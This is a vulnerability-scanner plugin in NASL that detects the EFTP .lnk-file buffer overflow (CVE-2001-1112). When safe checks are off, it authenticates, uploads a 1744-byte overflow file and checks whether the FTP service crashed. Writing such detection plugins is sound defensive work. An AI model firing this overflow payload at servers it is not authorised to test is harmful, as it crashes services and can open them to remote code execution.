if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.10928" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_bugtraq_id( 3330 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2001-1112" );
	script_name( "EFTP buffer overflow" );
	script_category( ACT_MIXED_ATTACK );
	script_tag( name: "qod_type", value: "remote_banner" );
	script_copyright( "Copyright (C) 2001 Michel Arboi" );
	script_family( "Gain a shell remotely" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ftp/eftp/detected" );
	script_tag( name: "solution", value: "Upgrade EFTP to 2.0.8.x." );
	script_tag( name: "summary", value: "It was possible to crash the EFTP service by
  uploading a *.lnk file containing too much data." );
	script_tag( name: "impact", value: "A cracker may use this attack to make this
  service crash continuously, or run arbitrary code on your system." );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
port = ftp_get_port( default: 21 );
banner = ftp_get_banner( port: port );
if(!banner || !ContainsString( banner, "EFTP " )){
	exit( 0 );
}
writeable_dir = get_kb_item( "ftp/writeable_dir" );
use_banner = 1;
kb_creds = ftp_get_kb_creds();
user_login = kb_creds["login"];
user_passwd = kb_creds["pass"];
if(user_login && user_passwd && writeable_dir){
	use_banner = safe_checks();
}
if(use_banner){
	if(egrep( pattern: ".*EFTP Version 2\\.0\\.[0-7]\\.*", string: banner )){
		security_message( port: port );
	}
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
r = ftp_authenticate( socket: soc, user: user_login, pass: user_passwd );
if(!r){
	ftp_close( socket: soc );
	exit( 0 );
}
cmd = NASLString( "CWD ", writeable_dir, "\\r\\n" );
send( socket: soc, data: cmd );
a = recv_line( socket: soc, length: 1024 );
vt_strings = get_vt_strings();
f_name = NASLString( vt_strings["default"], rand() % 10, rand() % 10, rand() % 10, rand() % 10, ".lnk" );
port2 = ftp_pasv( socket: soc );
soc2 = open_sock_tcp( port: port2, transport: get_port_transport( port ) );
cmd = NASLString( "STOR ", f_name, "\\r\\n" );
send( socket: soc, data: cmd );
r = recv_line( socket: soc, length: 1024 );
if(ereg( pattern: "^5[0-9][0-9] .*", string: r )){
	exit( 0 );
}
d = NASLString( crap( length: 1744, data: "A" ), "CCCC" );
send( socket: soc2, data: d );
close( soc2 );
cmd = NASLString( "LIST\\r\\n" );
send( socket: soc, data: cmd );
r = recv_line( socket: soc, length: 1024 );
ftp_close( socket: soc );
soc = open_sock_tcp( port );
if(!soc){
	security_message( port: port );
}
if(soc){
	ftp_authenticate( socket: soc, user: user_login, pass: user_passwd );
	cmd = NASLString( "CWD ", writeable_dir, "\\r\\n" );
	send( socket: soc, data: cmd );
	r = recv_line( socket: soc, length: 1024 );
	cmd = NASLString( "DELE ", f_name, "\\r\\n" );
	send( socket: soc, data: cmd );
	r = recv_line( socket: soc, length: 1024 );
	ftp_close( socket: soc );
}

